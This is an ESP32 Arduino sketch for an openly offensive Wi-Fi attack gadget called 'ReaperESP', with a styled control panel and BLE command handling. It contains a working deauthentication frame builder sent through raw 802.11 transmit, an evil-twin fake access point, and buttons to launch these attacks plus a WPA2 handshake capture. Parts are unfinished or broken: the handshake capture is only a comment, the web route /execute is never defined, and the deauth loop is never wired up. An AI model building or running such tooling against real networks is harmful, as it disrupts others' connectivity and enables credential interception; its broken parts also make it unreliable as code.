#include <WiFi.h>
#include <ESPAsyncWebServer.h>
#include <AsyncTCP.h>
#include <DNSServer.h>
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEServer.h>
#include "esp_wifi.h"
#include <Preferences.h>

// Device Information
const char *deviceName = "ReaperESP";

// Wi-Fi Credentials for Web Control
const char *controlSSID = "ReaperESP-SoulHarvest";
const char *controlPass = "harvest123";

// Fake Wi-Fi (Evil Twin Attack)
const char *fakeSSID = "Lost_Souls";
const char *fakePass = "12345678";

// Attack States
bool soulHarvestActive = false;
bool soulDisruptionActive = false;
bool spectralFlooding = false;
bool wraithListening = false;
bool phantomSniffing = false;

AsyncWebServer server(80);
AsyncWebSocket ws("/ws");
DNSServer dnsServer;
Preferences preferences;

// BLE Service & Characteristics UUIDs
#define SERVICE_UUID        "4fafc201-1fb5-459e-8fcc-c5c9c331914b"
#define COMMAND_UUID        "beb5483e-36e1-4688-b7f5-ea07361b26a8"
#define NOTIFY_UUID         "f3641405-00b0-4240-ba50-05ca45bf8abc"

BLEServer *pServer = NULL;
BLECharacteristic *pCommandCharacteristic = NULL;
BLECharacteristic *pNotifyCharacteristic = NULL;

// Function to send notifications
void sendNotification(String message) {
    Serial.println("[ReaperESP] " + message);
    ws.textAll(message);
    if (pNotifyCharacteristic) {
        pNotifyCharacteristic->setValue(message.c_str());
        pNotifyCharacteristic->notify();
    }
}

// Function to execute deauthentication attack (Soul Disruption)
void sendDeauthPacket(uint8_t *targetMAC) {
    uint8_t deauthPacket[26] = {
        0xC0, 0x00, 0x3A, 0x01,
        targetMAC[0], targetMAC[1], targetMAC[2], targetMAC[3], targetMAC[4], targetMAC[5],
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
        targetMAC[0], targetMAC[1], targetMAC[2], targetMAC[3], targetMAC[4], targetMAC[5],
        0x00, 0x00, 0x07, 0x00
    };
    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
}

// Function to capture WPA2 handshakes (Phantom Handshake Capture)
void capturePhantomHandshake() {
    sendNotification("Capturing Phantom Handshake");
    // 4-way handshake capture logic here
}

// BLE Callbacks for remote control
class MyCallbacks : public BLECharacteristicCallbacks {
    void onWrite(BLECharacteristic *pCharacteristic) {
        std::string command = pCharacteristic->getValue();
        Serial.println("Received BLE Command: " + String(command.c_str()));

        if (command == "START_SOUL_HARVEST") {
            soulHarvestActive = true;
            WiFi.softAP(fakeSSID, fakePass);
            sendNotification("Soul Harvest Started");
        }
        else if (command == "STOP_SOUL_HARVEST") {
            soulHarvestActive = false;
            WiFi.softAPdisconnect(true);
            sendNotification("Soul Harvest Stopped");
        }
        else if (command == "START_SOUL_DISRUPTION") {
            soulDisruptionActive = true;
            sendNotification("Soul Disruption Started");
        }
        else if (command == "STOP_SOUL_DISRUPTION") {
            soulDisruptionActive = false;
            sendNotification("Soul Disruption Stopped");
        }
    }
};

// Serve Web UI
const char webPage[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ReaperESP - Control Panel</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;700&display=swap');

        body {
            background-color: #121212;
            color: #e0e0e0;
            font-family: 'Roboto', sans-serif;
            text-align: center;
            padding: 20px;
        }

        h1 {
            color: #ff4444;
            font-size: 32px;
            text-shadow: 0 0 5px crimson;
            margin-bottom: 10px;
        }

        .status {
            font-size: 18px;
            padding: 12px;
            background-color: #222;
            border-radius: 8px;
            display: inline-block;
            margin-bottom: 20px;
            width: 90%;
            box-shadow: 0 0 10px rgba(255, 0, 0, 0.5);
        }

        .button-container {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 10px;
        }

        .button {
            width: 90%;
            max-width: 300px;
            padding: 15px;
            font-size: 18px;
            font-weight: bold;
            color: white;
            background: linear-gradient(90deg, #8b0000, #ff4444);
            border: none;
            border-radius: 10px;
            cursor: pointer;
            text-transform: uppercase;
            transition: all 0.3s ease-in-out;
            box-shadow: 0 0 10px rgba(255, 0, 0, 0.5);
        }

        .button:hover {
            background: #ff0000;
            box-shadow: 0 0 20px rgba(255, 0, 0, 0.8);
            transform: scale(1.05);
        }
    </style>
</head>
<body>
    <h1>🕱 ReaperESP - Control Panel 🕱</h1>
    
    <p class="status" id="status">System Status: Idle</p>

    <div class="button-container">
        <button class="button" onclick="sendCommand('START_SOUL_HARVEST')">Start Evil Twin Attack</button>
        <button class="button" onclick="sendCommand('STOP_SOUL_HARVEST')">Stop Evil Twin Attack</button>

        <button class="button" onclick="sendCommand('START_SOUL_DISRUPTION')">Start Deauth Attack</button>
        <button class="button" onclick="sendCommand('STOP_SOUL_DISRUPTION')">Stop Deauth Attack</button>

        <button class="button" onclick="sendCommand('START_PHANTOM_HANDSHAKE')">Capture WPA2 Handshake</button>
    </div>

    <script>
        function sendCommand(cmd) {
            fetch(`/execute?cmd=${cmd}`)
                .then(response => response.text())
                .then(data => {
                    document.getElementById("status").innerText = "System Status: " + cmd.replace("_", " ");
                })
                .catch(error => console.error("Error sending command:", error));
        }
    </script>
</body>
</html>
)rawliteral";

void setup() {
    Serial.begin(115200);
    WiFi.softAP(controlSSID, controlPass);
    server.on("/", HTTP_GET, [](AsyncWebServerRequest *request) {
        request->send_P(200, "text/html", webPage);
    });
    server.begin();
}

void loop() {
    dnsServer.processNextRequest();
}

